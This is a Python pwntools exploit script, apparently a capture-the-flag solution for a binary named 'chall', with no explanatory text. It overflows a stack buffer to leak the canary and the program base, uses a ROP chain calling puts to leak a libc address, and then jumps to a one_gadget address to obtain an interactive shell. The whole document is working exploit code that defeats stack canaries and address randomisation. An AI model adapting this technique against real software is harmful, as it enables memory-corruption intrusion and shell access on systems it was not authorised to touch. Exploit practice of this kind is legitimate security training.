from pwn import *


libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
e = ELF('chall')

p = process('chall')

p.sendlineafter('buffer: ', 'A' * 72 + 'x')
p.recvuntil('x')

canary = u64('\x00' + p.recv(7))
log.info('canary: {}'.format(hex(canary)))

p.sendlineafter('buffer: ', 'A' * 72 + 'B' * 8 + 'x')
p.recvuntil('x')

base_addr = u64('\x00' + p.recv(5) + '\x00\x00') - 0xb00
log.info('base: {}'.format(hex(base_addr)))

pop_rdi_ret = 0x0000000000000c33 # pop rdi ; ret

p.sendlineafter('buffer: ', 'A' * 72 + p64(canary) + p64(0x0) + p64(base_addr + pop_rdi_ret) + p64(base_addr + e.got['puts']) + p64(base_addr + e.plt['puts']) + p64(base_addr + 0x7d0))
p.sendlineafter('buffer: ', '')

leak = u64(p.recvline()[:-1] + '\x00\x00')
libc_base = leak - libc.symbols['puts']
log.info('libc base: {}'.format(hex(libc_base)))
one_gadget = libc_base + 0x4f2c5

p.sendlineafter('buffer: ', 'A' * 72 + p64(canary) + p64(0x0) + p64(one_gadget))
p.sendlineafter('buffer: ', '')
p.interactive()